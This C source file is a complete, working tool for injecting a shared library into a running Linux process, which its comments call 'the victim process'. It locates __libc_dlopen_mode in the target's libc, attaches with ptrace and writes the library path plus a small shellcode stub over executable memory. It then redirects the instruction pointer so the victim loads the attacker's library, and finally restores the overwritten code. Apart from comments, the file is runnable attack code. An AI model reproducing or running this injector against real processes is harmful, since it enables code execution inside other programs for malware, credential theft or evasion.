// The roadmap of the injector tool is simple:
// Compute the address of __libc_dlopen_mode into the victim process.
// Attach the victim process with ptrace.
// Modify the victim process to make it execute the __libc_dlopen_mode function

//https://dee-dee.fr/2020/04/10/shared-library-injection-into-a-linux-process-part-1/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <libgen.h>
#include <stdlib.h>

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>


void remove_newline(char *str) {
    char *p = strchr(str, '\n');
    if (p) *p = '\0';
}


unsigned long findStartAddress(int pid) {

    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        perror("[-] Failed to open /proc/<pid>/maps");
        return 0; 
    }

    char libc_path[256];
    char line[256];
    
    while (fgets(line, sizeof(line), fp) != NULL) {
        if (strstr(line, "r-xp") && strstr(line, "libc")) {
            char *start = strtok(line, "-");
            if (start) {
                unsigned long start_addr = strtoul(start, NULL, 16);
                return start_addr;
            }
            break;
        }
    }
    fclose(fp);
    return 0;
}


unsigned long returnFunctionAddress(const char *libc_name, const char *function_name) {
    remove_newline((char *)libc_name);
    void *handle = dlopen(libc_name, RTLD_NOW);
    if (!handle) {
        fprintf(stderr, "[-] Failed to open library: %s\n", dlerror());
        return 0;
    }

    unsigned long func_addr = (unsigned long)dlsym(handle, function_name);
    if (!func_addr) {
        fprintf(stderr, "[-] Failed to find function %s: %s\n", function_name, dlerror());
        dlclose(handle);
        return 0;
    }

    dlclose(handle);
    return func_addr;
}


char* returnLibCName(int pid){
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        perror("[-] Failed to open libc");
        return NULL;
    }
    char line[256];
    char *library_name = malloc(256);
    if (library_name == NULL) {
        perror("[-] Memory allocation failed");
        fclose(fp);
        return NULL;
    }


    while (fgets(line, sizeof(line), fp) != NULL) {
        if (strstr(line, "r-xp") && strstr(line, "libc-")) {
            char *libc_name = strrchr(line, ' ');
            if (libc_name) {
                strncpy(library_name, libc_name + 1, 255);
                library_name[255] = '\0';
                return library_name;
            }
        }
    }
    free(library_name);
    fclose(fp);
    return NULL;
}


void ptraceRead(int pid, unsigned long long addr, void *data, int len) {
    long word;
    char *ptr = (char *)data;
    for (int i = 0; i < len; i += sizeof(word)) {
        word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
        if (word == -1) {
            perror("[!] Error reading process memory");
            exit(1);
        }
        memcpy(ptr + i, &word, sizeof(word));
    }
}

//void ptraceWrite(int pid, unsigned long long addr, void *data, int len)
void ptraceWrite(int pid, unsigned long long addr,const char *data, int len) {
    long word = 0;
    for (int i = 0; i < len; i += sizeof(word), word = 0) {
        memcpy(&word, data + i, sizeof(word));
        if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {
            printf("[!] Error writing to process memory\n");
            exit(1);
        }
	}
}


int main(int argc, char *argv[]) {
    ////////////////////////////////////
    // Phase 0:  Initialize everything//
    ///////////////////////////////////

    if (argc < 3) {
        printf("Usage: %s <pid> <library_path>\n", argv[0]);
        return 1;
    }

    int pid = atoi(argv[1]);
    const char *library_path = argv[2];

    if(access(library_path, R_OK) == -1) {
        perror("[-] Library path is not accessible");
        return 1;
    }

    ///////////////////////////////////////////////
    // Phase 1:  Calculate Offset if having ALSR//
    //////////////////////////////////////////////
    
    printf("[+] Process ID to be injected: %d\n", pid); 

    int current_pid = getpid();
    printf("[+] Current Process ID: %d\n", current_pid);

    unsigned long start_address = findStartAddress(pid);
    unsigned long current_start_address = findStartAddress(current_pid);

    printf("[+] Start address of libc in target process: 0x%lx\n", start_address);
    printf("[+] Start address of libc in current process: 0x%lx\n", current_start_address);

    char* orginal_libc_name = returnLibCName(current_pid);
    char* target_libc_name = returnLibCName(pid);

    printf("[+] Original libc name: %s\n", orginal_libc_name);
    printf("[+] Target process libc name: %s\n", target_libc_name);

    if(orginal_libc_name == NULL || target_libc_name == NULL) {
        printf("[-] Failed to retrieve libc names.\n");
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }
  
    if(strcmp(orginal_libc_name, target_libc_name) != 0) {
        printf("[-] The target process is not using the same libc as the current process.\n");
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }

    unsigned long local_libc_base = current_start_address;
    unsigned long target_libc_base = start_address;

    unsigned long local_func_addr = returnFunctionAddress(orginal_libc_name, "__libc_dlopen_mode");
    if (local_func_addr == 0) {
        printf("[-] Failed to find __libc_dlopen_mode in current process.\n");
        return 1;
    }

    unsigned long offset = local_func_addr - local_libc_base;
    unsigned long remote_func_addr = target_libc_base + offset;

    printf("[+] __libc_dlopen_mode offset in libc: 0x%lx\n", offset);
    printf("[+] __libc_dlopen_mode address in target process: 0x%lx\n", remote_func_addr);

    //////////////////////////////////////////
    // Phase 2: Attach to the target process//
    //////////////////////////////////////////

    // PTRACE_ATTACH - allows you to attach to one process, pausing the debugged process
    // PTRACE_PEEKTEXT - allows you to read data from the address space of another process
    // PTRACE_POKETEXT - allows you to write data to the address space of another process
    // PTRACE_GETREGS - reads the current state of the process registers
    // PTRACE_SETREGS - writes the state of the process registers
    // PTRACE_CONT - continues execution of the debugged process

    printf("[+] Attaching to process %d...\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("[-] PTRACE_ATTACH failed");
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }
    waitpid(pid, NULL, 0);


    /////////////////////////////////////////
    // Phase 3: Modify the victim process //
    /////////////////////////////////////////
    
    struct user_regs_struct old_regs, new_regs;
    if(ptrace(PTRACE_GETREGS,pid, NULL, &old_regs) == -1) {
        perror("[-] PTRACE_GETREGS failed");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }
    memcpy(&new_regs, &old_regs, sizeof(struct user_regs_struct));

    unsigned long long free_space = start_address;
    unsigned char *old_code = (unsigned char *)malloc(8096);
    
    if (old_code == NULL) {
        perror("[-] Memory allocation failed");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }

    ptraceRead(pid, free_space, old_code, 8096);
    ptraceWrite(pid, free_space, library_path, strlen(library_path) + 1);
    ptraceWrite(pid, free_space + strlen(library_path) + 1, "\x90\x90\x90\x90\x90\x90\x90", 8); 
    // ptraceRead(pid, free_space, old_code, 8096);
    // ptraceWrite(pid, free_space, "/root/process-inject-ptrace/build/inject.so\x00", 46);
    // ptraceWrite(pid, free_space + 46, "\x90\x90\x90\x90\x90\x90\x90", 8);

    unsigned char shellcode[] = {
        0xBE, 0x02, 0x00, 0x00, 0x00, // mov $2, %esi
        0xFF, 0xD0,                   // call *%rax
        0xCC                          // int3
    };
    ptraceWrite(pid, free_space + strlen(library_path) + 9, shellcode, sizeof(shellcode));
    // ptraceWrite(pid, free_space + 54, shellcode, sizeof(shellcode));

    new_regs.rip = free_space + strlen(library_path) + 9; // set to the shellcode address
    // new_regs.rip = free_space + 54; // set trỏ tới shellcode
    new_regs.rdi = free_space; // address of
    new_regs.rsi = 2;
    new_regs.rax = remote_func_addr;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &new_regs) == -1) {
        perror("[-] PTRACE_SETREGS failed");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        free(old_code);
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }

    int status;
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
        perror("[-] PTRACE_CONT failed");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        free(old_code);
        free(orginal_libc_name);
        free(target_libc_name);
        return 1;
    }
    waitpid(pid, &status, WUNTRACED);

    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
		ptrace(PTRACE_GETREGS, pid, NULL, &new_regs);
		if (new_regs.rax != 0x0) {
			printf("[+] Injected library loaded at address %p\n", (void*)new_regs.rax);
		} else {
			printf("[x] Library could not be injected\n");
			return 0;
		}

		ptraceWrite(pid, (unsigned long long)free_space, old_code, 8096);
		ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
	} 

    return 0;
}